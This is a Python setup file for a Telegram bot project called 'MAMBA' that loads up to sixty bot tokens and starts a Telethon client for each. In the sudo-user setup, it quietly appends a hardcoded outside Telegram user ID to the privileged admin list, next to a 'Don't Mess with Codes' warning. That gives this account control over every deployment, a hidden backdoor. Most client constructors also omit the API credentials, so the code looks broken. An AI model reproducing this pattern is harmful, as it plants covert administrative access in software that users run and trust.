

import os
import sys
import random
import asyncio
import telethon.utils
from telethon import TelegramClient, events
from decouple import config
from os import getenv
import logging
import time


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

MAMBAversion = "v0.2.0"

#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default="!")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
BOT_TOKEN = config("BOT_TOKEN", default=None)
BOT_TOKEN2 = config("BOT_TOKEN2", default=None)
BOT_TOKEN3 = config("BOT_TOKEN3", default=None)
BOT_TOKEN4 = config("BOT_TOKEN4", default=None)
BOT_TOKEN5 = config("BOT_TOKEN5", default=None)
BOT_TOKEN6 = config("BOT_TOKEN6", default=None)
BOT_TOKEN7 = config("BOT_TOKEN7", default=None)
BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
BOT_TOKEN11 = config("BOT_TOKEN11", default=None)
BOT_TOKEN12 = config("BOT_TOKEN12", default=None)
BOT_TOKEN13 = config("BOT_TOKEN13", default=None)
BOT_TOKEN14 = config("BOT_TOKEN14", default=None)
BOT_TOKEN15 = config("BOT_TOKEN15", default=None)
BOT_TOKEN16 = config("BOT_TOKEN16", default=None)
BOT_TOKEN17 = config("BOT_TOKEN17", default=None)
BOT_TOKEN18 = config("BOT_TOKEN18", default=None)
BOT_TOKEN19 = config("BOT_TOKEN19", default=None)
BOT_TOKEN20 = config("BOT_TOKEN20", default=None)
BOT_TOKEN21 = config("BOT_TOKEN21", default=None)
BOT_TOKEN22 = config("BOT_TOKEN22", default=None)
BOT_TOKEN23 = config("BOT_TOKEN23", default=None)
BOT_TOKEN24 = config("BOT_TOKEN24", default=None)
BOT_TOKEN25 = config("BOT_TOKEN25", default=None)
BOT_TOKEN26 = config("BOT_TOKEN26", default=None)
BOT_TOKEN27 = config("BOT_TOKEN27", default=None)
BOT_TOKEN28 = config("BOT_TOKEN28", default=None)
BOT_TOKEN29 = config("BOT_TOKEN29", default=None)
BOT_TOKEN30 = config("BOT_TOKEN30", default=None)
BOT_TOKEN31 = config("BOT_TOKEN31", default=None)
BOT_TOKEN32 = config("BOT_TOKEN32", default=None)
BOT_TOKEN33 = config("BOT_TOKEN33", default=None)
BOT_TOKEN34 = config("BOT_TOKEN34", default=None)
BOT_TOKEN35 = config("BOT_TOKEN35", default=None)
BOT_TOKEN36 = config("BOT_TOKEN36", default=None)
BOT_TOKEN37 = config("BOT_TOKEN37", default=None)
BOT_TOKEN38 = config("BOT_TOKEN38", default=None)
BOT_TOKEN39 = config("BOT_TOKEN39", default=None)
BOT_TOKEN40 = config("BOT_TOKEN40", default=None)
BOT_TOKEN41 = config("BOT_TOKEN41", default=None)
BOT_TOKEN42 = config("BOT_TOKEN42", default=None)
BOT_TOKEN43 = config("BOT_TOKEN43", default=None)
BOT_TOKEN44 = config("BOT_TOKEN44", default=None)
BOT_TOKEN45 = config("BOT_TOKEN45", default=None)
BOT_TOKEN46 = config("BOT_TOKEN46", default=None)
BOT_TOKEN47 = config("BOT_TOKEN47", default=None)
BOT_TOKEN48 = config("BOT_TOKEN48", default=None)
BOT_TOKEN49 = config("BOT_TOKEN49", default=None)
BOT_TOKEN50 = config("BOT_TOKEN50", default=None)
BOT_TOKEN51 = config("BOT_TOKEN51", default=None)
BOT_TOKEN52 = config("BOT_TOKEN52", default=None)
BOT_TOKEN53 = config("BOT_TOKEN53", default=None)
BOT_TOKEN54 = config("BOT_TOKEN54", default=None)
BOT_TOKEN55 = config("BOT_TOKEN55", default=None)
BOT_TOKEN56 = config("BOT_TOKEN56", default=None)
BOT_TOKEN57 = config("BOT_TOKEN57", default=None)
BOT_TOKEN58 = config("BOT_TOKEN58", default=None)
BOT_TOKEN59 = config("BOT_TOKEN59", default=None)
BOT_TOKEN60 = config("BOT_TOKEN60", default=None)

SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 1102947903 not in SUDO_USERS:
    SUDO_USERS.append(1102947903)

OWNER_ID = int(os.environ.get("OWNER_ID", None))

# Don't Mess with Codes !! 
DB_URI = config("DATABASE_URL", None)
SUDO_USERS.append(OWNER_ID)
SUDO_USERS.append(1102947903)

# Tokens

BOT0 = TelegramClient('BOT0', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

BOT1 = TelegramClient('BOT1').start(bot_token=BOT_TOKEN2)

BOT2 = TelegramClient('BOT2').start(bot_token=BOT_TOKEN3)

BOT3 = TelegramClient('BOT3').start(bot_token=BOT_TOKEN4)

BOT4 = TelegramClient('BOT4').start(bot_token=BOT_TOKEN5)

BOT5 = TelegramClient('BOT5').start(bot_token=BOT_TOKEN6)

BOT6 = TelegramClient('BOT6').start(bot_token=BOT_TOKEN7)

BOT7 = TelegramClient('BOT7').start(bot_token=BOT_TOKEN8)

BOT8 = TelegramClient('BOT8').start(bot_token=BOT_TOKEN9)

BOT9 = TelegramClient('BOT9').start(bot_token=BOT_TOKEN10)

BOT10 = TelegramClient('BOT10').start(bot_token=BOT_TOKEN11)

BOT11 = TelegramClient('BOT11').start(bot_token=BOT_TOKEN12)

BOT12 = TelegramClient('BOT12').start(bot_token=BOT_TOKEN13)

BOT13 = TelegramClient('BOT13').start(bot_token=BOT_TOKEN14)

BOT14 = TelegramClient('BOT14').start(bot_token=BOT_TOKEN15)

BOT15 = TelegramClient('BOT15').start(bot_token=BOT_TOKEN16)

BOT16 = TelegramClient('BOT16').start(bot_token=BOT_TOKEN17)

BOT17 = TelegramClient('BOT17').start(bot_token=BOT_TOKEN18)

BOT18 = TelegramClient('BOT18').start(bot_token=BOT_TOKEN19)

BOT19 = TelegramClient('BOT19').start(bot_token=BOT_TOKEN20)

BOT20 = TelegramClient('BOT20').start(bot_token=BOT_TOKEN21)

BOT21 = TelegramClient('BOT21').start(bot_token=BOT_TOKEN22)

BOT22 = TelegramClient('BOT22').start(bot_token=BOT_TOKEN23)

BOT23 = TelegramClient('BOT23').start(bot_token=BOT_TOKEN24)

BOT24 = TelegramClient('BOT24').start(bot_token=BOT_TOKEN25)

BOT25 = TelegramClient('BOT25').start(bot_token=BOT_TOKEN26)

BOT26 = TelegramClient('BOT26').start(bot_token=BOT_TOKEN27)

BOT27 = TelegramClient('BOT27').start(bot_token=BOT_TOKEN28)

BOT28 = TelegramClient('BOT28').start(bot_token=BOT_TOKEN29)

BOT29 = TelegramClient('BOT29').start(bot_token=BOT_TOKEN30)

BOT30 = TelegramClient('BOT30').start(bot_token=BOT_TOKEN31)

BOT31 = TelegramClient('BOT31').start(bot_token=BOT_TOKEN32)

BOT32 = TelegramClient('BOT32').start(bot_token=BOT_TOKEN33)

BOT33 = TelegramClient('BOT33').start(bot_token=BOT_TOKEN34)

BOT34 = TelegramClient('BOT34').start(bot_token=BOT_TOKEN35)

BOT35 = TelegramClient('BOT35').start(bot_token=BOT_TOKEN36)

BOT36 = TelegramClient('BOT36').start(bot_token=BOT_TOKEN37)

BOT37 = TelegramClient('BOT37').start(bot_token=BOT_TOKEN38)

BOT38 = TelegramClient('BOT38').start(bot_token=BOT_TOKEN39)

BOT39 = TelegramClient('BOT39').start(bot_token=BOT_TOKEN40)

BOT40 = TelegramClient('BOT40').start(bot_token=BOT_TOKEN41)

BOT41 = TelegramClient('BOT41').start(bot_token=BOT_TOKEN42)

BOT42 = TelegramClient('BOT42').start(bot_token=BOT_TOKEN43)

BOT43 = TelegramClient('BOT43').start(bot_token=BOT_TOKEN44)

BOT44 = TelegramClient('BOT44').start(bot_token=BOT_TOKEN45)

BOT45 = TelegramClient('BOT45').start(bot_token=BOT_TOKEN46)

BOT46 = TelegramClient('BOT46').start(bot_token=BOT_TOKEN47)

BOT47 = TelegramClient('BOT47').start(bot_token=BOT_TOKEN48)

BOT48 = TelegramClient('BOT48').start(bot_token=BOT_TOKEN49)

BOT49 = TelegramClient('BOT49').start(bot_token=BOT_TOKEN50)

BOT50 = TelegramClient('BOT50').start(bot_token=BOT_TOKEN51)

BOT51 = TelegramClient('BOT51').start(bot_token=BOT_TOKEN52)

BOT52 = TelegramClient('BOT52').start(bot_token=BOT_TOKEN53)

BOT53 = TelegramClient('BOT53').start(bot_token=BOT_TOKEN54)

BOT54 = TelegramClient('BOT54').start(bot_token=BOT_TOKEN55)

BOT55 = TelegramClient('BOT55').start(bot_token=BOT_TOKEN56)

BOT56 = TelegramClient('BOT56').start(bot_token=BOT_TOKEN57)

BOT57 = TelegramClient('BOT57').start(bot_token=BOT_TOKEN58)

BOT58 = TelegramClient('BOT58').start(bot_token=BOT_TOKEN59)

BOT59 = TelegramClient('BOT59').start(bot_token=BOT_TOKEN60)

